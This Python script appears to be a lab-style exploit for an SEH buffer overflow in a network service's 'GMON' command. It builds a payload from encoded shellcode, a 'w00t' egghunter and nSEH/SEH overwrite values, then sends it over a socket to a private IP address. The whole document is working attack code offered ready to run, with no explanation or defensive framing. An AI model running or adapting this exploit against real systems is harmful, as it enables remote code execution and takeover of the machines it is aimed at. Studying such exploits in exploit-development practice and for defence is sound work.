#!/usr/bin/python

import socket
import os
import sys

host="192.168.35.129"
port=1000

MAX_BUFFER_SIZE = 3579

shellcode = (
"\xdd\xc7\xbe\xb5\xe6\xa1\x14\xd9\x74\x24\xf4\x5f\x33"
"\xc9\xb1\x31\x31\x77\x18\x83\xef\xfc\x03\x77\xa1\x04"
"\x54\xe8\x21\x4a\x97\x11\xb1\x2b\x11\xf4\x80\x6b\x45"
"\x7c\xb2\x5b\x0d\xd0\x3e\x17\x43\xc1\xb5\x55\x4c\xe6"
"\x7e\xd3\xaa\xc9\x7f\x48\x8e\x48\x03\x93\xc3\xaa\x3a"
"\x5c\x16\xaa\x7b\x81\xdb\xfe\xd4\xcd\x4e\xef\x51\x9b"
"\x52\x84\x29\x0d\xd3\x79\xf9\x2c\xf2\x2f\x72\x77\xd4"
"\xce\x57\x03\x5d\xc9\xb4\x2e\x17\x62\x0e\xc4\xa6\xa2"
"\x5f\x25\x04\x8b\x50\xd4\x54\xcb\x56\x07\x23\x25\xa5"
"\xba\x34\xf2\xd4\x60\xb0\xe1\x7e\xe2\x62\xce\x7f\x27"
"\xf4\x85\x73\x8c\x72\xc1\x97\x13\x56\x79\xa3\x98\x59"
"\xae\x22\xda\x7d\x6a\x6f\xb8\x1c\x2b\xd5\x6f\x20\x2b"
"\xb6\xd0\x84\x27\x5a\x04\xb5\x65\x30\xdb\x4b\x10\x76"
"\xdb\x53\x1b\x26\xb4\x62\x90\xa9\xc3\x7a\x73\x8e\x3c"
"\x31\xde\xa6\xd4\x9c\x8a\xfb\xb8\x1e\x61\x3f\xc5\x9c"
"\x80\xbf\x32\xbc\xe0\xba\x7f\x7a\x18\xb6\x10\xef\x1e"
"\x65\x10\x3a\x7d\xe8\x82\xa6\xac\x8f\x22\x4c\xb1")

egghunter = (
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"\x77\x30\x30\x74" # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

sDefSEH = "GMON /.:/"

nseh = "\xEB\x06\x90\x90"
seh = "\xb4\x10\x50\x62"

payload = "w00tw00t" + shellcode

buffer = sDefSEH + "\x90"*(3531-len(payload)) + payload + nseh + seh + egghunter + "D"*(5050 - 3531 -len(egghunter))


sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((host,port))
sock.send(buffer)
sock.close()
